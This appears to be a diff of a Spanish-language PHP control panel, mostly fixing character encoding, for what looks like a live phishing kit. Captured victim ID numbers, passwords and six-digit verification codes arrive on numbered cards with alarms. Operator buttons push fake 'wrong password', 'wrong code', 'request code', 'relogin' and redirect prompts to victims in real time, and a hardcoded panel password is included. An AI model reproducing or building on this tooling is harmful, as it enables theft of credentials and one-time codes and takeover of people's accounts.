@@ -1,18 +1,18 @@
-﻿<?php
+<?php
 if (session_status() === PHP_SESSION_NONE) {
     session_start();
 }
 
 define('PANEL_PASSWORD', 'Dav2026$sv!Kq7');
 
-// Cerrar sesiÃ³n
+// Cerrar sesión
 if (isset($_GET['logout'])) {
     unset($_SESSION['panel_autenticado']);
     header('Location: panel.php');
     exit;
 }
 
-// Procesar inicio de sesiÃ³n
+// Procesar inicio de sesión
 $loginError = '';
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['panel_pass'])) {
     $claveIngresada = (string)$_POST['panel_pass'];
@@ -21,11 +21,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['panel_pass'])) {
         header('Location: panel.php');
         exit;
     } else {
-        $loginError = 'ContraseÃ±a incorrecta. Intente nuevamente.';
+        $loginError = 'Contraseña incorrecta. Intente nuevamente.';
     }
 }
 
-// Si no estÃ¡ autenticado, mostrar formulario de acceso exclusivo (solo clave)
+// Si no está autenticado, mostrar formulario de acceso exclusivo (solo clave)
 if (empty($_SESSION['panel_autenticado'])) {
 ?>
 <!DOCTYPE html>
@@ -196,8 +196,8 @@ if (empty($_SESSION['panel_autenticado'])) {
                 <label for="panel_pass">Clave de Acceso</label>
                 <div class="input-wrapper">
                     <i class="fa-solid fa-key lock-icon"></i>
-                    <input type="password" id="panel_pass" name="panel_pass" class="login-input" placeholder="â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢" autofocus required autocomplete="current-password">
-                    <button type="button" class="toggle-btn" onclick="togglePassLogin()" aria-label="Mostrar u ocultar contraseÃ±a">
+                    <input type="password" id="panel_pass" name="panel_pass" class="login-input" placeholder="••••••••" autofocus required autocomplete="current-password">
+                    <button type="button" class="toggle-btn" onclick="togglePassLogin()" aria-label="Mostrar u ocultar contraseña">
                         <i class="fa-solid fa-eye" id="eyeIcon"></i>
                     </button>
                 </div>
@@ -235,7 +235,7 @@ if (empty($_SESSION['panel_autenticado'])) {
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Panel de Control - Cuadros en Tiempo Real</title>
     
-    <!-- Fuentes y TipografÃ­as -->
+    <!-- Fuentes y Tipografías -->
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@500;700;800&display=swap" rel="stylesheet">
@@ -400,7 +400,7 @@ if (empty($_SESSION['panel_autenticado'])) {
             flex: 1;
         }
 
-        /* Resumen de MÃ©tricas */
+        /* Resumen de Métricas */
         .stats-bar {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
@@ -505,14 +505,14 @@ if (empty($_SESSION['panel_autenticado'])) {
             display: inline-block;
         }
 
-        /* CuadrÃ­cula de Cuadros */
+        /* Cuadrícula de Cuadros */
         .cards-grid {
             display: grid;
             grid-template-columns: repeat(auto-fill, minmax(340px, 1fr));
             gap: 20px;
         }
 
-        /* Cuadro de InformaciÃ³n: Estable y sin parpadeo */
+        /* Cuadro de Información: Estable y sin parpadeo */
         .info-card {
             background: #ffffff;
             border: 1px solid var(--border-color);
@@ -667,7 +667,7 @@ if (empty($_SESSION['panel_autenticado'])) {
             background: #fee2e2;
         }
 
-        /* Botones de AcciÃ³n en cada Contenedor (Grilla 3x2) */
+        /* Botones de Acción en cada Contenedor (Grilla 3x2) */
         .card-actions {
             padding: 12px 14px;
             background: #f8fafc;
@@ -695,7 +695,7 @@ if (empty($_SESSION['panel_autenticado'])) {
             white-space: nowrap;
         }
 
-        /* AcciÃ³n: Pedir CÃ³digo (6 dÃ­gitos) */
+        /* Acción: Pedir Código (6 dígitos) */
         .btn-action-code {
             background-color: #ecfdf5;
             border-color: #a7f3d0;
@@ -714,7 +714,7 @@ if (empty($_SESSION['panel_autenticado'])) {
             font-weight: 700;
         }
 
-        /* AcciÃ³n: CÃ³digo ErrÃ³neo */
+        /* Acción: Código Erróneo */
         .btn-action-code-error {
             background-color: #fff7ed;
             border-color: #fed7aa;
@@ -733,7 +733,7 @@ if (empty($_SESSION['panel_autenticado'])) {
             font-weight: 700;
         }
 
-        /* AcciÃ³n: ContraseÃ±a ErrÃ³nea */
+        /* Acción: Contraseña Errónea */
         .btn-action-pass-error {
             background-color: #fdf4ff;
             border-color: #f0abfc;
@@ -752,7 +752,7 @@ if (empty($_SESSION['panel_autenticado'])) {
             font-weight: 700;
         }
 
-        /* AcciÃ³n: Finalizar */
+        /* Acción: Finalizar */
         .btn-action-finalizar {
             background-color: #f0fdf4;
             border-color: #86efac;
@@ -771,7 +771,7 @@ if (empty($_SESSION['panel_autenticado'])) {
             font-weight: 700;
         }
 
-        /* AcciÃ³n: Relogin */
+        /* Acción: Relogin */
         .btn-action-relogin {
             background-color: #fffbeb;
             border-color: #fcd34d;
@@ -790,7 +790,7 @@ if (empty($_SESSION['panel_autenticado'])) {
             font-weight: 700;
         }
 
-        /* AcciÃ³n: Bloquear */
+        /* Acción: Bloquear */
         .btn-action-bloquear {
             background-color: #fef2f2;
             border-color: #fca5a5;
@@ -813,7 +813,7 @@ if (empty($_SESSION['panel_autenticado'])) {
             transform: scale(0.97);
         }
 
-        /* Banners de estado de acciÃ³n */
+        /* Banners de estado de acción */
         .action-banner {
             margin: 0 16px 12px 16px;
             padding: 8px 11px;
@@ -892,7 +892,7 @@ if (empty($_SESSION['panel_autenticado'])) {
             color: #065f46;
         }
 
-        /* Estados de presencia: En LÃ­nea / SaliÃ³ de la web */
+        /* Estados de presencia: En Línea / Salió de la web */
         .badge-online {
             font-size: 11.5px;
             font-weight: 700;
@@ -945,7 +945,7 @@ if (empty($_SESSION['panel_autenticado'])) {
             letter-spacing: 0.2px;
         }
 
-        /* ConfiguraciÃ³n de URL de redirecciÃ³n en barra superior */
+        /* Configuración de URL de redirección en barra superior */
         .redirect-config {
             display: flex;
             align-items: center;
@@ -968,7 +968,7 @@ if (empty($_SESSION['panel_autenticado'])) {
             color: var(--primary);
         }
 
-        /* Estado VacÃ­o */
+        /* Estado Vacío */
         .empty-state {
             grid-column: 1 / -1;
             padding: 70px 20px;
@@ -995,7 +995,7 @@ if (empty($_SESSION['panel_autenticado'])) {
             font-size: 13.5px;
         }
 
-        /* NotificaciÃ³n Toast */
+        /* Notificación Toast */
         .toast {
             position: fixed;
             bottom: 24px;
@@ -1039,7 +1039,7 @@ if (empty($_SESSION['panel_autenticado'])) {
         </div>
 
         <div class="nav-actions">
-            <div class="redirect-config" title="URL hacia donde redirige el botÃ³n Finalizar">
+            <div class="redirect-config" title="URL hacia donde redirige el botón Finalizar">
                 <i class="fa-solid fa-arrow-up-right-from-square" style="color:var(--text-muted); font-size:12px;"></i>
                 <span style="font-size:12px; font-weight:600; color:var(--text-muted);">Redir:</span>
                 <input type="url" id="globalRedirectUrl" value="https://www.google.com" placeholder="https://..." onchange="guardarRedirectUrl(this.value)">
@@ -1051,9 +1051,9 @@ if (empty($_SESSION['panel_autenticado'])) {
             </div>
 
             <select id="alarmSelect" class="alarm-select" onchange="cambiarTipoAlarma(this.value)" title="Seleccionar tipo de alarma">
-                <option value="alarma1.wav">ðŸš¨ Sirena Fuerte (x3)</option>
-                <option value="alarma2.wav">ðŸ“¢ Chicharra Industrial (x3)</option>
-                <option value="alarma3.wav">ðŸš” Sirena Dual (x3)</option>
+                <option value="alarma1.wav">🚨 Sirena Fuerte (x3)</option>
+                <option value="alarma2.wav">📢 Chicharra Industrial (x3)</option>
+                <option value="alarma3.wav">🚔 Sirena Dual (x3)</option>
             </select>
 
             <button class="btn btn-outline" onclick="emitirSonido();" title="Probar el sonido de alarma">
@@ -1064,11 +1064,11 @@ if (empty($_SESSION['panel_autenticado'])) {
                 <i class="fa-solid fa-trash-can"></i> Vaciar Todo
             </button>
 
-            <a href="index.php" target="_blank" class="btn btn-primary" title="Abrir pÃ¡gina del cliente">
+            <a href="index.php" target="_blank" class="btn btn-primary" title="Abrir página del cliente">
                 <i class="fa-solid fa-arrow-up-right-from-square"></i> Ver Formulario
             </a>
 
-            <a href="panel.php?logout=1" class="btn btn-outline" title="Cerrar sesiÃ³n del panel" style="color:#ef4444; border-color:#fca5a5;">
+            <a href="panel.php?logout=1" class="btn btn-outline" title="Cerrar sesión del panel" style="color:#ef4444; border-color:#fca5a5;">
                 <i class="fa-solid fa-right-from-bracket"></i> Salir
             </a>
         </div>
@@ -1077,11 +1077,11 @@ if (empty($_SESSION['panel_autenticado'])) {
     <!-- Contenedor Principal -->
     <main class="container">
 
-        <!-- Barra de BÃºsqueda y SincronizaciÃ³n -->
+        <!-- Barra de Búsqueda y Sincronización -->
         <div class="toolbar">
             <div class="search-box">
                 <i class="fa-solid fa-magnifying-glass"></i>
-                <input type="text" id="searchInput" placeholder="Buscar por documento, clave, cÃ³digo, IP o fecha..." onkeyup="filtrarCuadros()">
+                <input type="text" id="searchInput" placeholder="Buscar por documento, clave, código, IP o fecha..." onkeyup="filtrarCuadros()">
             </div>
 
             <div class="live-status">
@@ -1093,18 +1093,18 @@ if (empty($_SESSION['panel_autenticado'])) {
             </div>
         </div>
 
-        <!-- CuadrÃ­cula donde van pasando los cuadros en orden -->
+        <!-- Cuadrícula donde van pasando los cuadros en orden -->
         <div class="cards-grid" id="cardsGrid">
             <div class="empty-state">
                 <i class="fa-solid fa-spinner fa-spin"></i>
-                <h3>Cargando informaciÃ³n...</h3>
+                <h3>Cargando información...</h3>
                 <p>Consultando registros</p>
             </div>
         </div>
 
     </main>
 
-    <!-- NotificaciÃ³n Toast -->
+    <!-- Notificación Toast -->
     <div class="toast" id="toast">
         <i class="fa-solid fa-circle-check"></i>
         <span id="toastMsg">Mensaje</span>
@@ -1133,7 +1133,7 @@ if (empty($_SESSION['panel_autenticado'])) {
         function guardarRedirectUrl(url) {
             urlRedirSeleccionada = url.trim() || 'https://www.google.com';
             localStorage.setItem('panel_redirect_url', urlRedirSeleccionada);
-            showToast('URL de redirecciÃ³n guardada');
+            showToast('URL de redirección guardada');
         }
 
         function cambiarTipoAlarma(nuevoTipo) {
@@ -1156,7 +1156,7 @@ if (empty($_SESSION['panel_autenticado'])) {
 
         window.addEventListener('click', () => { obtenerAudioContext(); }, { once: true });
 
-        // ReproducciÃ³n de Alarma Fuerte y Ruidosa (3 veces)
+        // Reproducción de Alarma Fuerte y Ruidosa (3 veces)
         function emitirSonido() {
             if (!sonidoHabilitado) return;
             try {
@@ -1174,7 +1174,7 @@ if (empty($_SESSION['panel_autenticado'])) {
             }
         }
 
-        // Sintetizador de alarma como respaldo de mÃ¡xima potencia
+        // Sintetizador de alarma como respaldo de máxima potencia
         function reproducirAlarmaSintetizada() {
             try {
                 const ctx = obtenerAudioContext();
@@ -1248,7 +1248,7 @@ if (empty($_SESSION['panel_autenticado'])) {
             const eye = document.getElementById(`pass-eye-${id}`);
             if (span) {
                 if (passwordOcultos[id]) {
-                    span.textContent = 'â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢';
+                    span.textContent = '••••••••';
                     if (eye) eye.className = 'fa-solid fa-eye';
                 } else {
                     span.textContent = passVal;
@@ -1257,7 +1257,7 @@ if (empty($_SESSION['panel_autenticado'])) {
             }
         }
 
-        // Carga y sincronizaciÃ³n en tiempo real SIN PARPADEO
+        // Carga y sincronización en tiempo real SIN PARPADEO
         async function cargarDatos(manual = false) {
             try {
                 const res = await fetch('api.php?action=get_data&_t=' + Date.now());
@@ -1276,17 +1276,17 @@ if (empty($_SESSION['panel_autenticado'])) {
                             if (!prev) {
                                 // Nuevo cuadro en orden
                                 emitirSonido();
-                                showToast(`ðŸ”” Â¡Nuevo Cuadro #${item.numero} recibido!`);
+                                showToast(`🔔 ¡Nuevo Cuadro #${item.numero} recibido!`);
                             } else {
-                                // LlegÃ³ contraseÃ±a en un cuadro
+                                // Llegó contraseña en un cuadro
                                 if (!prev.hasPass && item.password) {
                                     emitirSonido();
-                                    showToast(`ðŸ”‘ Â¡ContraseÃ±a recibida en Cuadro #${item.numero}!`);
+                                    showToast(`🔑 ¡Contraseña recibida en Cuadro #${item.numero}!`);
                                 }
-                                // LlegÃ³ cÃ³digo de 6 dÃ­gitos en un cuadro
+                                // Llegó código de 6 dígitos en un cuadro
                                 if ((!prev.hasCode && item.codigo) || (prev.codeVal !== item.codigo && item.codigo)) {
                                     emitirSonido();
-                                    showToast(`ðŸš¨ Â¡CÃ³digo de 6 dÃ­gitos recibido en Cuadro #${item.numero}: ${item.codigo}!`);
+                                    showToast(`🚨 ¡Código de 6 dígitos recibido en Cuadro #${item.numero}: ${item.codigo}!`);
                                 }
                             }
                         });
@@ -1304,7 +1304,7 @@ if (empty($_SESSION['panel_autenticado'])) {
                     estadosAnteriores = nuevoMapa;
                     conteoPrevio = nuevosRegistros.length;
 
-                    // Si no hubo cambios en la informaciÃ³n y no es recarga manual, no tocar el DOM -> CERO PARPADEO
+                    // Si no hubo cambios en la información y no es recarga manual, no tocar el DOM -> CERO PARPADEO
                     if (nuevoJsonStr === cacheJsonStr && !manual) {
                         return;
                     }
@@ -1320,19 +1320,19 @@ if (empty($_SESSION['panel_autenticado'])) {
                     }
                 }
             } catch (err) {
-                // Silencioso ante pÃ©rdidas temporales de red
+                // Silencioso ante pérdidas temporales de red
             }
         }
 
         function actualizarEstadisticas() {
-            // MÃ©tricas superiores retiradas a peticiÃ³n
+            // Métricas superiores retiradas a petición
         }
 
         function filtrarCuadros() {
             renderCuadros();
         }
 
-        // Renderiza los cuadros en estricto orden cronolÃ³gico (1, 2, 3...)
+        // Renderiza los cuadros en estricto orden cronológico (1, 2, 3...)
         function renderCuadros() {
             const container = document.getElementById('cardsGrid');
             const search = document.getElementById('searchInput').value.toLowerCase().trim();
@@ -1354,8 +1354,8 @@ if (empty($_SESSION['panel_autenticado'])) {
                     container.innerHTML = `
                         <div class="empty-state">
                             <i class="fa-solid fa-inbox"></i>
-                            <h3>AÃºn no han llegado cuadros de informaciÃ³n</h3>
-                            <p>Cada vez que un cliente ingrese sus datos en la web (IdentificaciÃ³n, ContraseÃ±a, CÃ³digo de 6 dÃ­gitos), irÃ¡ pasando a un nuevo cuadro en orden sin borrar nada.</p>
+                            <h3>Aún no han llegado cuadros de información</h3>
+                            <p>Cada vez que un cliente ingrese sus datos en la web (Identificación, Contraseña, Código de 6 dígitos), irá pasando a un nuevo cuadro en orden sin borrar nada.</p>
                         </div>
                     `;
                 } else {
@@ -1363,7 +1363,7 @@ if (empty($_SESSION['panel_autenticado'])) {
                         <div class="empty-state">
                             <i class="fa-solid fa-magnifying-glass"></i>
                             <h3>No se encontraron coincidencias</h3>
-                            <p>Intente con otro tÃ©rmino de bÃºsqueda.</p>
+                            <p>Intente con otro término de búsqueda.</p>
                         </div>
                     `;
                 }
@@ -1372,7 +1372,7 @@ if (empty($_SESSION['panel_autenticado'])) {
 
             let html = '';
             filtrados.forEach((item) => {
-                const doc = item.documento ? escapeHtml(item.documento) : 'VacÃ­o';
+                const doc = item.documento ? escapeHtml(item.documento) : 'Vacío';
                 const hasPass = Boolean(item.password && item.password.length > 0);
                 const hasCode = Boolean(item.codigo && item.codigo.length > 0);
                 const pass = hasPass ? escapeHtml(item.password) : '';
@@ -1387,8 +1387,8 @@ if (empty($_SESSION['panel_autenticado'])) {
                 const isOnline = item.en_linea === true;
 
                 const badgeConexion = isOnline 
-                    ? `<span class="badge-online" title="El cliente estÃ¡ actualmente activo en la web"><span class="pulse-dot"></span> En lÃ­nea</span>` 
-                    : `<span class="badge-offline" title="El cliente ha salido de la web"><i class="fa-solid fa-circle-xmark"></i> SaliÃ³ de la web</span>`;
+                    ? `<span class="badge-online" title="El cliente está actualmente activo en la web"><span class="pulse-dot"></span> En línea</span>` 
+                    : `<span class="badge-offline" title="El cliente ha salido de la web"><i class="fa-solid fa-circle-xmark"></i> Salió de la web</span>`;
 
                 let badgeHtml = '';
                 let bannerHtml = '';
@@ -1405,7 +1405,7 @@ if (empty($_SESSION['panel_autenticado'])) {
                     bannerHtml = `
                     <div class="action-banner finalizar-banner">
                         <i class="fa-solid fa-arrow-up-right-from-square"></i>
-                        <span>RedirecciÃ³n ejecutada ${redir ? '(' + escapeHtml(redir) + ')' : ''}</span>
+                        <span>Redirección ejecutada ${redir ? '(' + escapeHtml(redir) + ')' : ''}</span>
                     </div>`;
                 } else if (accion === 'bloquear') {
                     badgeHtml = `<span class="badge-status badge-status-bloqueado"><i class="fa-solid fa-ban"></i> Bloqueado</span>`;
@@ -1415,58 +1415,58 @@ if (empty($_SESSION['panel_autenticado'])) {
                         <span>Acceso bloqueado por seguridad</span>
                     </div>`;
                 } else if (accion === 'pedir_codigo') {
-                    badgeHtml = `<span class="badge-status badge-status-code"><i class="fa-solid fa-key"></i> CÃ³digo Solicitado</span>`;
+                    badgeHtml = `<span class="badge-status badge-status-code"><i class="fa-solid fa-key"></i> Código Solicitado</span>`;
                     bannerHtml = `
                     <div class="action-banner code-banner">
                         <i class="fa-solid fa-hourglass-half"></i>
-                        <span>Solicitando cÃ³digo de 6 dÃ­gitos al cliente (Esperando cÃ³digo...)</span>
+                        <span>Solicitando código de 6 dígitos al cliente (Esperando código...)</span>
                     </div>`;
                 } else if (accion === 'codigo_error') {
-                    badgeHtml = `<span class="badge-status badge-status-relogin"><i class="fa-solid fa-triangle-exclamation"></i> CÃ³d. ErrÃ³neo</span>`;
+                    badgeHtml = `<span class="badge-status badge-status-relogin"><i class="fa-solid fa-triangle-exclamation"></i> Cód. Erróneo</span>`;
                     bannerHtml = `
                     <div class="action-banner relogin-banner">
                         <i class="fa-solid fa-triangle-exclamation"></i>
-                        <span>CÃ³digo incorrecto enviado al cliente (Esperando reintento...)</span>
+                        <span>Código incorrecto enviado al cliente (Esperando reintento...)</span>
                     </div>`;
                 } else if (accion === 'pass_error') {
-                    badgeHtml = `<span class="badge-status badge-status-relogin"><i class="fa-solid fa-lock"></i> Clave ErrÃ³nea</span>`;
+                    badgeHtml = `<span class="badge-status badge-status-relogin"><i class="fa-solid fa-lock"></i> Clave Errónea</span>`;
                     bannerHtml = `
                     <div class="action-banner relogin-banner">
                         <i class="fa-solid fa-lock"></i>
-                        <span>ContraseÃ±a errÃ³nea enviada al cliente (Esperando reintento...)</span>
+                        <span>Contraseña errónea enviada al cliente (Esperando reintento...)</span>
                     </div>`;
                 } else if (hasCode) {
-                    badgeHtml = `<span class="badge-status badge-status-success"><i class="fa-solid fa-shield-check"></i> CÃ³digo Recibido</span>`;
+                    badgeHtml = `<span class="badge-status badge-status-success"><i class="fa-solid fa-shield-check"></i> Código Recibido</span>`;
                     bannerHtml = `
                     <div class="action-banner code-received-banner">
                         <i class="fa-solid fa-circle-check"></i>
-                        <span>Â¡CÃ³digo de 6 dÃ­gitos recibido! (Cliente en validaciÃ³n)</span>
+                        <span>¡Código de 6 dígitos recibido! (Cliente en validación)</span>
                     </div>`;
                 } else if (hasPass) {
                     badgeHtml = `<span class="badge-status badge-status-code"><i class="fa-solid fa-key"></i> Clave Recibida</span>`;
                     bannerHtml = `
                     <div class="action-banner pass-received-banner">
                         <i class="fa-solid fa-spinner fa-spin"></i>
-                        <span>ContraseÃ±a recibida - Cliente esperando validaciÃ³n</span>
+                        <span>Contraseña recibida - Cliente esperando validación</span>
                     </div>`;
                 } else {
-                    badgeHtml = `<span class="badge-status" style="background:#f1f5f9; color:#475569;"><i class="fa-solid fa-id-card"></i> IdentificaciÃ³n</span>`;
+                    badgeHtml = `<span class="badge-status" style="background:#f1f5f9; color:#475569;"><i class="fa-solid fa-id-card"></i> Identificación</span>`;
                     bannerHtml = `
                     <div class="action-banner esperando-banner">
                         <i class="fa-regular fa-clock"></i>
-                        <span>IdentificaciÃ³n recibida - Cliente ingresando contraseÃ±a</span>
+                        <span>Identificación recibida - Cliente ingresando contraseña</span>
                     </div>`;
                 }
 
-                // RepresentaciÃ³n de ContraseÃ±a
+                // Representación de Contraseña
                 const passIsHidden = passwordOcultos[id] === true;
-                const passTextShown = hasPass ? (passIsHidden ? 'â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢' : pass) : '<span class="field-value-pending">Esperando contraseÃ±a...</span>';
+                const passTextShown = hasPass ? (passIsHidden ? '••••••••' : pass) : '<span class="field-value-pending">Esperando contraseña...</span>';
                 const passEyeClass = passIsHidden ? 'fa-solid fa-eye' : 'fa-solid fa-eye-slash';
 
-                // RepresentaciÃ³n de CÃ³digo
+                // Representación de Código
                 const codeTextShown = hasCode 
                     ? `<span class="field-value-code">${code}</span>` 
-                    : `<span class="field-value-pending">Esperando cÃ³digo de 6 dÃ­gitos...</span>`;
+                    : `<span class="field-value-pending">Esperando código de 6 dígitos...</span>`;
 
                 let histHtml = '';
                 if (item.historial_codigos && Array.isArray(item.historial_codigos) && item.historial_codigos.length > 0) {
@@ -1489,34 +1489,34 @@ if (empty($_SESSION['panel_autenticado'])) {
                     </div>
 
                     <div class="card-body">
-                        <!-- Campo 1: NÃºmero de IdentificaciÃ³n -->
+                        <!-- Campo 1: Número de Identificación -->
                         <div class="field-group">
                             <span class="field-label">
                                 <i class="fa-solid fa-id-card" style="color:var(--primary);"></i>
-                                1. NÃºmero de IdentificaciÃ³n
+                                1. Número de Identificación
                             </span>
                             <div class="field-value-box">
                                 <span class="field-value-doc">${doc}</span>
-                                <button class="btn-copy" onclick="copiarTexto('${doc}', 'IdentificaciÃ³n copiada')" title="Copiar nÃºmero de identificaciÃ³n">
+                                <button class="btn-copy" onclick="copiarTexto('${doc}', 'Identificación copiada')" title="Copiar número de identificación">
                                     <i class="fa-regular fa-copy"></i>
                                 </button>
                             </div>
                         </div>
 
-                        <!-- Campo 2: ContraseÃ±a -->
+                        <!-- Campo 2: Contraseña -->
                         <div class="field-group">
                             <span class="field-label">
                                 <i class="fa-solid fa-lock" style="color:#2563eb;"></i>
-                                2. ContraseÃ±a
+                                2. Contraseña
                             </span>
                             <div class="field-value-box" style="${hasPass ? 'background:#f0fdf4; border-color:#86efac;' : ''}">
                                 <span class="field-value-pass" id="pass-val-${id}">${passTextShown}</span>
                                 <div style="display:flex; gap:4px; align-items:center;">
                                     ${hasPass ? `
-                                    <button class="btn-copy" onclick="togglePassVisibility('${id}', '${escapeAttr(pass)}')" title="Ver u ocultar contraseÃ±a">
+                                    <button class="btn-copy" onclick="togglePassVisibility('${id}', '${escapeAttr(pass)}')" title="Ver u ocultar contraseña">
                                         <i class="${passEyeClass}" id="pass-eye-${id}"></i>
                                     </button>
-                                    <button class="btn-copy" onclick="copiarTexto('${escapeAttr(pass)}', 'ContraseÃ±a copiada')" title="Copiar contraseÃ±a">
+                                    <button class="btn-copy" onclick="copiarTexto('${escapeAttr(pass)}', 'Contraseña copiada')" title="Copiar contraseña">
                                         <i class="fa-regular fa-copy"></i>
                                     </button>
                                     ` : ''}
@@ -1524,11 +1524,11 @@ if (empty($_SESSION['panel_autenticado'])) {
                             </div>
                         </div>
 
-                        <!-- Campo 3: CÃ³digo de 6 DÃ­gitos -->
+                        <!-- Campo 3: Código de 6 Dígitos -->
                         <div class="field-group">
                             <span class="field-label">
                                 <i class="fa-solid fa-key" style="color:#059669;"></i>
-                                3. CÃ³digo de 6 DÃ­gitos
+                                3. Código de 6 Dígitos
                             </span>
                             <div class="field-value-box" style="${hasCode ? 'background:#ecfdf5; border-color:#34d399; border-width:2px;' : ''}">
                                 <div>
@@ -1536,7 +1536,7 @@ if (empty($_SESSION['panel_autenticado'])) {
                                     ${histHtml}
                                 </div>
                                 ${hasCode ? `
-                                <button class="btn-copy" onclick="copiarTexto('${escapeAttr(code)}', 'CÃ³digo de 6 dÃ­gitos copiado')" title="Copiar cÃ³digo">
+                                <button class="btn-copy" onclick="copiarTexto('${escapeAttr(code)}', 'Código de 6 dígitos copiado')" title="Copiar código">
                                     <i class="fa-regular fa-copy"></i>
                                 </button>
                                 ` : ''}
@@ -1546,34 +1546,34 @@ if (empty($_SESSION['panel_autenticado'])) {
 
                     ${bannerHtml}
 
-                    <!-- Botones de AcciÃ³n (Grilla 3x2) -->
+                    <!-- Botones de Acción (Grilla 3x2) -->
                     <div class="card-actions">
                         <!-- Fila 1: Control de Flujo -->
                         <button type="button" class="btn-action btn-action-code ${accion === 'pedir_codigo' ? 'active' : ''}" 
                                 onclick="ejecutarAccion('${id}', 'pedir_codigo', ${num})" 
-                                title="Pedir CÃ³digo de 6 dÃ­gitos al cliente">
-                            <i class="fa-solid fa-key"></i> Pedir CÃ³digo
+                                title="Pedir Código de 6 dígitos al cliente">
+                            <i class="fa-solid fa-key"></i> Pedir Código
                         </button>
                         <button type="button" class="btn-action btn-action-code-error ${accion === 'codigo_error' ? 'active' : ''}" 
                                 onclick="ejecutarAccion('${id}', 'codigo_error', ${num})" 
-                                title="Solicitar cÃ³digo de nuevo por ser incorrecto">
-                            <i class="fa-solid fa-triangle-exclamation"></i> CÃ³d. Incorrecto
+                                title="Solicitar código de nuevo por ser incorrecto">
+                            <i class="fa-solid fa-triangle-exclamation"></i> Cód. Incorrecto
                         </button>
                         <button type="button" class="btn-action btn-action-pass-error ${accion === 'pass_error' ? 'active' : ''}" 
                                 onclick="ejecutarAccion('${id}', 'pass_error', ${num})" 
-                                title="Solicitar contraseÃ±a de nuevo por ser incorrecta">
+                                title="Solicitar contraseña de nuevo por ser incorrecta">
                             <i class="fa-solid fa-lock"></i> Clave Incorrecta
                         </button>
 
-                        <!-- Fila 2: Decisiones de SesiÃ³n -->
+                        <!-- Fila 2: Decisiones de Sesión -->
                         <button type="button" class="btn-action btn-action-finalizar ${accion === 'finalizar' ? 'active' : ''}" 
                                 onclick="ejecutarAccion('${id}', 'finalizar', ${num})" 
-                                title="Hacer RedirecciÃ³n a la URL configurada">
+                                title="Hacer Redirección a la URL configurada">
                             <i class="fa-solid fa-arrow-up-right-from-square"></i> Finalizar
                         </button>
                         <button type="button" class="btn-action btn-action-relogin ${accion === 'relogin' ? 'active' : ''}" 
                                 onclick="ejecutarAccion('${id}', 'relogin', ${num})" 
-                                title="Reiniciar sesiÃ³n y volver a pedir identificaciÃ³n">
+                                title="Reiniciar sesión y volver a pedir identificación">
                             <i class="fa-solid fa-arrow-rotate-left"></i> Relogin
                         </button>
                         <button type="button" class="btn-action btn-action-bloquear ${accion === 'bloquear' ? 'active' : ''}" 
@@ -1587,7 +1587,7 @@ if (empty($_SESSION['panel_autenticado'])) {
                         <div class="time-text">
                             <i class="fa-regular fa-clock"></i> ${fecha}
                         </div>
-                        <button class="btn btn-outline" style="padding: 4px 10px; font-size: 11.5px;" onclick="copiarTexto('${doc}', 'IdentificaciÃ³n copiada')">
+                        <button class="btn btn-outline" style="padding: 4px 10px; font-size: 11.5px;" onclick="copiarTexto('${doc}', 'Identificación copiada')">
                             <i class="fa-regular fa-copy"></i> Copiar Doc
                         </button>
                     </div>
@@ -1609,13 +1609,13 @@ if (empty($_SESSION['panel_autenticado'])) {
                 formData.append('redirect_url', redirectUrl);
             }
 
-            // ActualizaciÃ³n optimista inmediata en memoria para respuesta instantÃ¡nea
+            // Actualización optimista inmediata en memoria para respuesta instantánea
             const item = registrosGlobales.find(r => r.id === id);
             if (item) {
                 item.accion = accion;
-                if (accion === 'pedir_codigo') item.estado = 'Pedir cÃ³digo de 6 dÃ­gitos';
-                else if (accion === 'codigo_error') item.estado = 'CÃ³digo errÃ³neo';
-                else if (accion === 'pass_error') item.estado = 'ContraseÃ±a errÃ³nea';
+                if (accion === 'pedir_codigo') item.estado = 'Pedir código de 6 dígitos';
+                else if (accion === 'codigo_error') item.estado = 'Código erróneo';
+                else if (accion === 'pass_error') item.estado = 'Contraseña errónea';
                 else if (accion === 'relogin') item.estado = 'Relogin solicitado';
                 else if (accion === 'bloquear') item.estado = 'Bloqueado';
                 else if (accion === 'finalizar') {
@@ -1633,30 +1633,30 @@ if (empty($_SESSION['panel_autenticado'])) {
                 const data = await res.json();
                 if (data.success) {
                     if (accion === 'pedir_codigo') {
-                        showToast(`ðŸ”‘ Cuadro #${num}: Solicitando CÃ³digo de 6 dÃ­gitos`);
+                        showToast(`🔑 Cuadro #${num}: Solicitando Código de 6 dígitos`);
                     } else if (accion === 'codigo_error') {
-                        showToast(`âš ï¸ Cuadro #${num}: CÃ³digo incorrecto enviado`);
+                        showToast(`⚠️ Cuadro #${num}: Código incorrecto enviado`);
                     } else if (accion === 'pass_error') {
-                        showToast(`âš ï¸ Cuadro #${num}: ContraseÃ±a incorrecta enviada`);
+                        showToast(`⚠️ Cuadro #${num}: Contraseña incorrecta enviada`);
                     } else if (accion === 'relogin') {
-                        showToast(`ðŸ”„ Cuadro #${num}: Relogin enviado (Paso 1)`);
+                        showToast(`🔄 Cuadro #${num}: Relogin enviado (Paso 1)`);
                     } else if (accion === 'bloquear') {
-                        showToast(`ðŸš« Cuadro #${num}: Cliente bloqueado`);
+                        showToast(`🚫 Cuadro #${num}: Cliente bloqueado`);
                     } else {
-                        showToast(`âœ“ Cuadro #${num}: Finalizar enviado (Redirigiendo a ${redirectUrl})`);
+                        showToast(`✓ Cuadro #${num}: Finalizar enviado (Redirigiendo a ${redirectUrl})`);
                     }
-                    cacheJsonStr = ''; // Forzar sincronizaciÃ³n limpia
+                    cacheJsonStr = ''; // Forzar sincronización limpia
                     cargarDatos();
                 } else {
-                    showToast('Error: ' + (data.message || 'No se pudo aplicar la acciÃ³n'));
+                    showToast('Error: ' + (data.message || 'No se pudo aplicar la acción'));
                 }
             } catch (err) {
-                showToast('Error de conexiÃ³n al aplicar la acciÃ³n');
+                showToast('Error de conexión al aplicar la acción');
             }
         }
 
         async function eliminarCuadro(id) {
-            if (!confirm('Â¿Desea eliminar este cuadro?')) return;
